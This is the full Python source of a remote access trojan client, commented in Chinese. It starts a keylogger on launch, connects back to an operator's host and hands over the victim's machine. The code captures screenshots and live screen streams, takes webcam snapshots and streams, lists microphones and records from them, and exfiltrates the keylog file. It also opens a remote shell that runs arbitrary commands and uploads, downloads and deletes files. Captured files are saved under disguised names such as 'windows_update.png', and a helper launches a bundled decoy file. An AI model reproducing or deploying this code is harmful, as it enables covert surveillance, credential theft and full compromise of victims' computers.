import socket
import subprocess
from time import sleep
import os
from PIL import ImageGrab
import cv2
from numpy import array
import threading
import pickle
from module import hoxino_key
if os.name == "nt":
    from pygrabber.dshow_graph import FilterGraph
from pvrecorder import PvRecorder
from sys import _MEIPASS
import platform
import json
import base64

# 检测当前环境是否有图形界面
def has_display():
    if os.name == "nt":  # Windows系统
        return True
    
    # Linux/Unix系统
    return "DISPLAY" in os.environ and os.environ["DISPLAY"] != ""

key = hoxino_key.hoxino_key()
key_thread = threading.Thread(target=key.start_key)
key_thread.start()
key_state = "true"


class Client():
    def __init__(self):
        connection = socket.socket()
        connection.connect((ip, port))
        
        # 添加环境信息
        self.has_gui = has_display()
        self.system_info = platform.system()
        env_info = {
            "hostname": socket.gethostname(),
            "path": os.path.abspath(__file__),
            "key_state": key_state,
            "has_gui": self.has_gui,
            "system": self.system_info
        }
        
        # 发送环境信息
        some_data = socket.gethostname() + ":delimiter:" + os.path.abspath(__file__) + ":delimiter:" + key_state
        connection.send(some_data.encode('utf-8'))
        
        self.connection = connection
        if os.name == "nt":
            self.ss_path = os.environ["appdata"] + "\\windows_service.png"
            self.cam_path = os.environ["appdata"] + "\\windows_update.png"
        else:
            self.ss_path = "/tmp/linux_service.png"
            self.cam_path = "/tmp/linux_update.png"
        self.key_path = key.key_file
        
        # 设置更大的默认接收缓冲区
        self.default_buffer_size = 4096
        
    def get_system_info(self):
        """获取无GUI环境下的系统信息作为替代"""
        info = {
            "system": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "processor": platform.processor(),
            "hostname": socket.gethostname(),
            "username": os.getlogin() if hasattr(os, 'getlogin') else subprocess.getoutput("whoami"),
            "current_dir": os.getcwd()
        }
        
        # 添加Linux特有信息
        if self.system_info.lower() == "linux":
            try:
                info["distro"] = subprocess.getoutput("cat /etc/os-release | grep PRETTY_NAME").split('=')[1].strip('"')
                info["kernel"] = subprocess.getoutput("uname -r")
                info["uptime"] = subprocess.getoutput("uptime -p")
                info["memory"] = subprocess.getoutput("free -h | grep Mem")
                info["disk"] = subprocess.getoutput("df -h / | tail -1")
            except:
                pass
                
        return info

    def screenshot(self):
        try:
            if self.has_gui:
                # 有GUI环境，使用原始方法
                ss = ImageGrab.grab()
                ss.save(self.ss_path)
                self.connection.send("ss_success".encode('utf-8'))
            else:
                # 无GUI环境，使用系统信息替代
                info = self.get_system_info()
                
                # 使用ASCII艺术替代截图
                ascii_art = """
 _____           _                   _        __       
/  ___|         | |                 (_)      / _|      
\ `--. _   _ ___| |_ ___ _ __ ___    _ _ __ | |_ ___  
 `--. \ | | / __| __/ _ \ '_ ` _ \  | | '_ \|  _/ _ \ 
/\__/ / |_| \__ \ ||  __/ | | | | | | | | | | || (_) |
\____/ \__, |___/\__\___|_| |_| |_| |_|_| |_|_| \___/ 
        __/ |                                          
       |___/                                           
                """
                
                # 添加系统信息
                info_text = "\n".join([f"{k}: {v}" for k, v in info.items()])
                full_text = ascii_art + "\n\n系统信息:\n" + info_text
                
                # 保存为文本文件
                with open(self.ss_path, "w", encoding="utf-8") as f:
                    f.write(full_text)
                
                self.connection.send("ss_alternative".encode('utf-8'))
            
            # 下载文件
            try:
                self.download_file(self.ss_path)
                os.remove(self.ss_path)
            except:
                self.connection.send("download_error".encode('utf-8'))
                
        except Exception as e:
            # 发送详细的错误信息
            self.connection.send(f"ss_error:{str(e)}".encode('utf-8'))
            return 0

    def screen_stream(self):
        if self.has_gui:
            # 有GUI环境，使用原始方法
            while True:
                try:
                    frame = ImageGrab.grab()
                    frame = frame.resize((854, 480))
                    frame = cv2.cvtColor(array(frame), cv2.COLOR_RGB2BGR)
                    screen_output = self.download_file(frame, "screen stream")
                    if screen_output == "screen_finish":
                        return 0
                except Exception as e:
                    self.connection.send(f"screen_error:{str(e)}".encode('utf-8'))
                    return 0
        else:
            # 无GUI环境，使用滚动文本模式
            try:
                # 发送初始信息
                self.connection.send("screen_text_mode".encode('utf-8'))
                
                # 接收确认
                response = self.connection.recv(1024).decode('utf-8', errors='replace')
                if response != "ready_for_text_mode":
                    return 0
                
                # 每秒发送一次更新的系统信息作为"视频流"
                counter = 0
                while True:
                    # 获取最新系统信息
                    info = self.get_system_info()
                    
                    # 添加一些动态数据
                    dynamic_data = {
                        "cpu_usage": subprocess.getoutput("top -bn1 | grep 'Cpu(s)' | awk '{print $2 + $4}'").strip() + "%",
                        "memory_usage": subprocess.getoutput("free | grep Mem | awk '{print $3/$2 * 100.0}'").strip() + "%",
                        "processes": subprocess.getoutput("ps aux | wc -l").strip(),
                        "time": subprocess.getoutput("date").strip(),
                        "last_login": subprocess.getoutput("last -n 1 | head -1").strip(),
                        "counter": str(counter)
                    }
                    
                    # 合并所有信息
                    full_info = {**info, **dynamic_data}
                    
                    # 创建格式化文本
                    text_data = json.dumps(full_info)
                    
                    # 发送数据
                    self.connection.send(f"text_frame:{text_data}".encode('utf-8'))
                    
                    # 等待继续或停止的指令
                    cmd = self.connection.recv(1024).decode('utf-8', errors='replace')
                    if cmd != "continue_text_stream":
                        break
                    
                    counter += 1
                    sleep(1)  # 每秒更新一次
                
                return 0
                    
            except Exception as e:
                self.connection.send(f"screen_error:{str(e)}".encode('utf-8'))
                return 0

    def download_file(self, file, operation=None):
        if operation == None:
            try:
                file_ = open(file, "rb")
                file_size = len(file_.read())
                file_.close()
                file_ = open(file, "rb")
                self.connection.send(str(file_size).encode('utf-8'))
                sleep(1)
                # 增加缓冲区大小
                buffer_size = 4096
                file_content = file_.read(buffer_size)
                while file_content:
                    self.connection.send(file_content)
                    file_content = file_.read(buffer_size)
                file_.close()
            except Exception as e:
                self.connection.send(f"download_error:{str(e)}".encode('utf-8'))
        elif operation == "cam stream":
            img = pickle.dumps(file)
            img_size = len(img)
            self.connection.send(str(img_size).encode('utf-8'))
            size_output = self.connection.recv(1024).decode('utf-8', errors='replace')
            if size_output == "get_size":
                self.connection.send(img)
                img_output = self.connection.recv(1024).decode('utf-8', errors='replace')
                if not img_output == "get_img":
                    return "cam_finish"
                else:
                    return "cam_continue"
            else:
                return "cam_finish"
        elif operation == "screen stream":
            frame = pickle.dumps(file)
            frame_size = len(frame)
            self.connection.send(str(frame_size).encode('utf-8'))
            size_output = self.connection.recv(1024).decode('utf-8', errors='replace')
            if size_output == "get_size":
                self.connection.send(frame)
                frame_output = self.connection.recv(1024).decode('utf-8', errors='replace')
                if not frame_output == "get_frame":
                    return "screen_finish"
                else:
                    return "screen_continue"
            else:
                return "screen_finish"
        
    def upload_file(self, file):
        try:
            file_size = self.connection.recv(self.default_buffer_size).decode('utf-8', errors='replace')
            if file_size == "upload_error":
                return 0
                
            file_size = int(file_size)
            try:
                uploaded_file = open(file, "wb")
                self.connection.send("upload_path_found".encode('utf-8'))
            except Exception as e:
                self.connection.send("upload_path_error".encode('utf-8'))
                return 0
                
            # 增加缓冲区大小
            buffer_size = 4096
            file_content = self.connection.recv(buffer_size)
            received_bytes = len(file_content)
            
            # 防止无限循环
            max_attempts = int(file_size / buffer_size) + 10
            attempts = 0
            
            while file_content and attempts < max_attempts:
                uploaded_file.write(file_content)
                if file_size > received_bytes:
                    file_content = self.connection.recv(buffer_size)
                    received_bytes = received_bytes + len(file_content)
                    attempts += 1
                else:
                    uploaded_file.close()
                    break
                    
            if attempts >= max_attempts and received_bytes < file_size:
                # 上传未完成但已达到最大尝试次数
                uploaded_file.close()
                return 0
        except Exception as e:
            print(f"上传文件错误: {str(e)}")
            return 0

    def get_cam_list(self, platform):
        if not self.has_gui:
            # 无GUI环境，提供替代信息
            cam_list = "无图形界面环境中的摄像头信息\n-----------------------\n"
            cam_list += "[!] 当前系统没有图形界面，无法列出实际摄像头\n"
            cam_list += "[!] 您可以使用虚拟摄像头模式(索引: 999)获取系统信息\n"
            self.connection.send(cam_list.encode('utf-8'))
            return
            
        if platform == "nt":
            cam_list = "可用摄像头索引\n----------------------\n"
            devices = FilterGraph().get_input_devices()
            for device_index, device_name in enumerate(devices):
                cam_list = cam_list + f"摄像头索引:[{device_index}]\t{device_name}\n"
            self.connection.send(cam_list.encode('utf-8'))
        else:
            index = 0
            i = 10
            cam_list = "可用摄像头索引\n----------------------\n"
            while i > 0:
                cam = cv2.VideoCapture(index)
                if cam.read()[0]:
                    cam_list = cam_list + f"摄像头索引:[{index}]\n"
                    cam.release()
                index += 1
                i -= 1
            self.connection.send(cam_list.encode('utf-8'))

    def cam_snapshot(self, cam_index):
        if not self.has_gui or cam_index == 999:
            # 无GUI环境或请求虚拟摄像头模式
            try:
                # 创建虚拟"摄像头"快照（系统信息）
                info = self.get_system_info()
                
                # 添加用户头像ASCII艺术
                avatar = """
     .---.
    /     \\
    \\.@-@./
    /`\\_/`\\
   //  _  \\\\
  | \\     )|_
 /`\\_`>  <_/ \\
 \\__/'---'\\__/
                """
                
                # 创建详细的系统信息作为"照片"
                now = subprocess.getoutput("date").strip()
                username = info.get('username', 'unknown')
                hostname = info.get('hostname', 'unknown')
                
                photo_text = f"""
{avatar}

用户: {username}@{hostname}
时间: {now}

系统信息:
---------
操作系统: {info.get('system', 'N/A')} {info.get('release', '')}
内核版本: {info.get('kernel', 'N/A')}
处理器: {info.get('processor', 'N/A')}
内存: {info.get('memory', 'N/A')}
磁盘: {info.get('disk', 'N/A')}
运行时间: {info.get('uptime', 'N/A')}

网络信息:
---------
{subprocess.getoutput("ip addr | grep inet | grep -v 127.0.0.1").strip()}

进程:
------
{subprocess.getoutput("ps aux | head -5").strip()}
...

==== 虚拟摄像头快照 (系统信息模式) ====
                """
                
                # 保存为文本文件
                with open(self.cam_path, "w", encoding="utf-8") as f:
                    f.write(photo_text)
                
                self.connection.send("camera_success".encode('utf-8'))
                # 下载文件
                try:
                    self.download_file(self.cam_path)
                    os.remove(self.cam_path)
                except:
                    self.connection.send("download_error".encode('utf-8'))
                    
            except Exception as e:
                self.connection.send(f"camera_error:{str(e)}".encode('utf-8'))
            return
        
        # 原始有GUI环境的处理
        camera = cv2.VideoCapture(cam_index)
        result, image = camera.read()
        if result:
            cv2.imwrite(self.cam_path, image)
            camera.release()
            self.connection.send("camera_success".encode('utf-8'))
            try:
                self.download_file(self.cam_path)
                os.remove(self.cam_path)
            except:
                self.connection.send("download_error".encode('utf-8'))
        else:
            self.connection.send("camera_error".encode('utf-8'))

    def cam_stream(self, cam_index): 
        if not self.has_gui or cam_index == 999:
            # 无GUI环境或请求虚拟摄像头模式
            try:
                # 发送初始信息
                self.connection.send("camera_text_mode".encode('utf-8'))
                
                # 接收确认
                response = self.connection.recv(1024).decode('utf-8', errors='replace')
                if response != "ready_for_camera_text":
                    return 0
                
                # 每秒发送一次更新的系统视频信息
                frame_counter = 0
                while True:
                    # 模拟不同的"帧"
                    if frame_counter % 5 == 0:
                        # 每5帧更新一次系统信息
                        info = self.get_system_info()
                        
                    # 获取动态数据
                    cpu_info = subprocess.getoutput("top -bn1 | head -3").strip()
                    memory_info = subprocess.getoutput("free -h").strip()
                    process_info = subprocess.getoutput(f"ps aux | head -{frame_counter % 10 + 5}").strip()
                    
                    # 创建"视频帧"
                    frame_data = {
                        "frame": frame_counter,
                        "time": subprocess.getoutput("date").strip(),
                        "cpu": cpu_info,
                        "memory": memory_info,
                        "processes": process_info
                    }
                    
                    # 发送数据
                    json_data = json.dumps(frame_data)
                    self.connection.send(f"camera_frame:{json_data}".encode('utf-8'))
                    
                    # 等待继续指令
                    cmd = self.connection.recv(1024).decode('utf-8', errors='replace')
                    if cmd != "continue_camera":
                        break
                    
                    frame_counter += 1
                    sleep(0.5)  # 每0.5秒更新一次，模拟视频流
                
                return 0
                
            except Exception as e:
                self.connection.send(f"camera_error:{str(e)}".encode('utf-8'))
                return 0
        
        # 原始有GUI环境的处理
        camera = cv2.VideoCapture(cam_index)
        while True:
            result, frame = camera.read()
            if result:
                cam_output = self.download_file(frame, "cam stream")
                if cam_output == "cam_finish":
                    camera.release()
                    return 0
            else:
                self.connection.send("camera_error".encode('utf-8'))
                return 0

    def get_microphone_list(self):
        mic_list = "Available Microphone Index\n----------------------\n"
        for index, device in enumerate(PvRecorder.get_available_devices()):
            mic_list =  mic_list + f"MICROPHONE INDEX:[{index}]\t{device}\n"
        self.connection.send(mic_list.encode())

    def rec_mic(self, mic_index):
        recorder = PvRecorder(frame_length=512, device_index=mic_index)
        recorder.start()
        while recorder.is_recording:
            frame = recorder.read()

    def get_key(self):
        try:
            key_file = open(self.key_path, "r")
            key_file.close()
            self.connection.send("key_success".encode())
        except:
            self.connection.send("key_error".encode())
            return 0
        try:
            sleep(1)
            self.download_file(self.key_path)
            os.remove(self.key_path)
        except:
            self.connection.send("download_error".encode())
            
    def shell(self):
        # 使用UTF-8编码发送当前路径
        self.connection.send((os.getcwd()).encode('utf-8'))
        while True:
            shell_command = self.connection.recv(self.default_buffer_size).decode('utf-8', errors='replace')
            splitted_shell_command = shell_command.split(" ")
            if shell_command == "exit":
                return 0
            elif splitted_shell_command[0] == "cd" and len(splitted_shell_command) > 1:
                try:
                    target_path = splitted_shell_command[1]
                    
                    # Windows系统下的中文路径处理
                    if os.name == "nt":
                        try:
                            # 规范化路径
                            target_path = os.path.normpath(target_path)
                        except:
                            pass
                    
                    os.chdir(target_path)
                    self.connection.send(f"cd_success:cd_delimiter:{os.getcwd()}".encode('utf-8'))
                except Exception as e:
                    error_msg = f"cd_error:cd_delimiter:{str(e)}"
                    self.connection.send(error_msg.encode('utf-8'))
            elif shell_command == "pwd":
                try:
                    pwd = os.getcwd()
                    self.connection.send(pwd.encode('utf-8'))
                except Exception as e:
                    self.connection.send(f"pwd_error:{str(e)}".encode('utf-8'))
            elif splitted_shell_command[0] == "mkdir" and len(splitted_shell_command) > 1:
                try:
                    os.mkdir(splitted_shell_command[1])
                    self.connection.send("mkdir_success".encode('utf-8'))
                except Exception as e:
                    self.connection.send(f"mkdir_error:{str(e)}".encode('utf-8'))
            elif splitted_shell_command[0] == "rmdir" and len(splitted_shell_command) > 1:
                try:
                    os.rmdir(splitted_shell_command[1])
                    self.connection.send("rmdir_success".encode('utf-8'))
                except Exception as e:
                    self.connection.send(f"rmdir_error:{str(e)}".encode('utf-8'))
            elif splitted_shell_command[0] == "rm" and len(splitted_shell_command) > 1:
                try:
                    os.remove(splitted_shell_command[1])
                    self.connection.send("rm_success".encode('utf-8'))
                except Exception as e:
                    self.connection.send(f"rm_error:{str(e)}".encode('utf-8'))
            elif splitted_shell_command[0] == "rename" and len(splitted_shell_command) > 2:
                try:
                    os.rename(splitted_shell_command[1], splitted_shell_command[2])
                    self.connection.send("rename_success".encode('utf-8'))
                except Exception as e:
                    self.connection.send(f"rename_error:{str(e)}".encode('utf-8'))
            elif splitted_shell_command[0] == "download" and len(splitted_shell_command) > 1:
                try:
                    self.download_file(splitted_shell_command[1])
                except Exception as e:
                    self.connection.send(f"download_error:{str(e)}".encode('utf-8'))
            elif splitted_shell_command[0] == "upload" and len(splitted_shell_command) > 1:
                try:
                    self.upload_file(splitted_shell_command[2])
                except Exception as e:
                    self.connection.send(f"upload_error:{str(e)}".encode('utf-8'))
            else:
                try:
                    # 将Latin1编码改为UTF-8，以支持中文
                    shell_command_output = subprocess.check_output(shell_command, shell=True, encoding="utf-8", errors="replace")
                    
                    # 计算输出的实际字节长度，而不是字符数
                    output_bytes = shell_command_output.encode('utf-8')
                    output_length = len(output_bytes)
                    
                    # 添加输出长度以便服务端正确处理
                    shell_command_output_with_length = f"{str(output_length)}:shell_delimiter:{shell_command_output}"
                    
                    # 检查数据大小，如果过大需要分块发送
                    if len(shell_command_output_with_length.encode('utf-8')) > 1024:
                        # 发送超大数据标记
                        self.connection.send("large_command_output".encode())
                        # 等待确认
                        confirm = self.connection.recv(1024).decode()
                        if confirm == "ready_for_large_output":
                            # 分块发送
                            chunks = [output_bytes[i:i+1024] for i in range(0, len(output_bytes), 1024)]
                            # 首先发送块数
                            self.connection.send(str(len(chunks)).encode())
                            self.connection.recv(1024)  # 等待确认
                            # 发送每个块
                            for chunk in chunks:
                                self.connection.send(chunk)
                                self.connection.recv(1024)  # 等待确认
                    else:
                        # 正常发送
                        self.connection.send(shell_command_output_with_length.encode('utf-8'))
                except Exception as e:
                    # 更详细的错误信息
                    error_msg = f"command_execute_error:{str(e)}"
                    self.connection.send(error_msg.encode('utf-8'))

    def main(self):
        global key_state
        global key
        while True:
            try:
                command = self.connection.recv(self.default_buffer_size).decode('utf-8', errors='replace')
                splitted_command = command.split(" ")
                if command == "shell":
                    self.shell()
                elif command == "screen_shot":
                    self.screenshot()
                elif command == "screen_stream":
                    self.screen_stream()
                elif command == "cam_list":
                    self.get_cam_list(os.name)
                elif splitted_command[0] == "cam_snapshot" and len(splitted_command) > 1:
                    try:
                        cam_index = int(splitted_command[1])
                        self.cam_snapshot(cam_index)
                    except ValueError:
                        self.connection.send("camera_error".encode('utf-8'))
                elif splitted_command[0] == "cam_stream" and len(splitted_command) > 1:
                    try:
                        cam_index = int(splitted_command[1])
                        self.cam_stream(cam_index)
                    except ValueError:
                        self.connection.send("camera_error".encode('utf-8'))
                elif command == "mic_list":
                    self.get_microphone_list()
                elif command == "start_key":
                    key = hoxino_key.hoxino_key()
                    key_thread = threading.Thread(target=key.start_key)
                    key_thread.start()
                    key_state = "true"
                elif command == "stop_key":
                    key.stop_key()
                    key_state = "false"
                elif command == "get_key":
                    self.get_key()
                elif command == "exit":
                    return 0
            except Exception as e:
                print(f"客户端错误: {str(e)}")
                try_connection()


def open_merge_file(merge_file):
    merge_file = _MEIPASS + f"\\\{merge_file}"
    subprocess.Popen(merge_file, shell=True)

def try_connection():
    while True:
        try:
            sleep(3)
            Client().main()
        except:
            try_connection()

